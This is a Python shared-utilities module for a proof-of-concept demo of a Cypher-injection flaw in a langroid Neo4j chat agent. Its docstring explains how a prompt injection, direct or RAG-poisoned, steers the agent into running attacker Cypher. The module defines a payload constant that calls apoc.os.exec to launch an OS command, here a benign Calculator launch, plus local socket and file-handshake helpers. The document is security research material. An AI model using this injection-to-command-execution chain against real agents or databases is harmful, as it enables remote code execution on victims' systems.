"""Shared rig for the langroid Neo4jChatAgent Cypher-injection demo (CVE-2026-55615).

Three OS processes, one per terminal, coordinate through small files in
DEMO_RUNTIME_DIR (injected by PoCumentary) and one real TCP hop:

  - neo4j_role.py    : the Neo4j+APOC backend (the sink). Runs whatever Cypher
                       the agent sends. Models an instance with APOC / dbms.security
                       procedures enabled, so a `CALL apoc.os.exec([...])` reaches
                       the OS. That is the precondition the advisory names.
  - agent_role.py    : a langroid `Neo4jChatAgent` stand-in. Turns an incoming
                       chat prompt into a Cypher tool call and hands it to the
                       driver with NO validation — the actual vulnerability.
  - attacker_role.py : an untrusted prompt (direct or RAG-poisoned) that smuggles
                       the malicious Cypher into the agent.

Self-contained: Python stdlib only, no network egress, no API key, no real
Neo4j/LLM. The agent->database hop is a real localhost socket (the "driver
session"); the attacker->agent prompt is a file drop. The RCE at the end is
real: the backend launches Calculator via the OS. Authorized security research;
educational reproduction of a published, patched CVE only.
"""
from __future__ import annotations

import os
import socket
import time
from pathlib import Path

RUNTIME_DIR = Path(os.environ.get("DEMO_RUNTIME_DIR", "/tmp/langroid-cypher-rce-demo"))
NEO4J_PORT_FILE = RUNTIME_DIR / "neo4j_port"      # neo4j -> agent (the bolt endpoint)
PROMPT_FILE = RUNTIME_DIR / "attacker_prompt"     # attacker -> agent (the chat message)

# The malicious Cypher the attacker steers the agent into running. `apoc.os.exec`
# stands in for the APOC / dbms.security OS-command surface that CVE-2026-55615
# reaches when those procedures are enabled on the target instance; the payload
# a real attacker uses depends on which such procedure is exposed. The bug is not
# this procedure — it is that the agent runs attacker-controlled Cypher unchecked.
PAYLOAD_CYPHER = "CALL apoc.os.exec(['open', '-a', 'Calculator']) YIELD out RETURN out"

# What a real victim would ask for — the benign task the agent exists to do. The
# attacker's instruction rides in on top of it (prompt injection).
BENIGN_TASK = "How many User nodes are connected to the 'admin' Role?"


def ensure_runtime() -> None:
    RUNTIME_DIR.mkdir(parents=True, exist_ok=True)


def signal(name: str) -> None:
    """Emit a PoCumentary handshake signal: touch a bare-name file in the runtime dir."""
    (RUNTIME_DIR / name).touch()


def wait_for(path: Path, description: str, timeout: float = 60.0) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if path.exists():
            return
        time.sleep(0.05)
    raise TimeoutError(f"timed out waiting for {description}: {path}")


def free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def connect(port: int, timeout: float = 30.0) -> socket.socket:
    """Connect to 127.0.0.1:port, retrying until the listener is up."""
    deadline = time.monotonic() + timeout
    last: Exception | None = None
    while time.monotonic() < deadline:
        try:
            return socket.create_connection(("127.0.0.1", port), timeout=5.0)
        except OSError as e:  # not listening yet
            last = e
            time.sleep(0.1)
    raise TimeoutError(f"could not connect to 127.0.0.1:{port}: {last}")


def send_line(sock: socket.socket, text: str) -> None:
    sock.sendall((text + "\n").encode())


def recv_line(sock: socket.socket) -> str:
    buf = b""
    while not buf.endswith(b"\n"):
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf.decode(errors="replace").rstrip("\n")


# --- readable on-screen pacing (no-op under `dryrun`, where DEMO_STEP_DELAY=0) ---

def pace(mult: float = 1.0) -> None:
    d = float(os.environ.get("DEMO_STEP_DELAY", "0"))
    if d > 0:
        time.sleep(d * mult)


def hr(ch: str = "=", n: int = 74) -> str:
    return ch * n


def banner(title: str, ch: str = "=") -> None:
    pace(0.6)
    print("\n" + hr(ch))
    print(title)
    print(hr(ch) + "\n", flush=True)
    pace(2.0)


def step(msg: str) -> None:
    print(f"  >> {msg}", flush=True)
    pace()


def ok(msg: str) -> None:
    print(f"  ** {msg}", flush=True)
    pace(0.7)
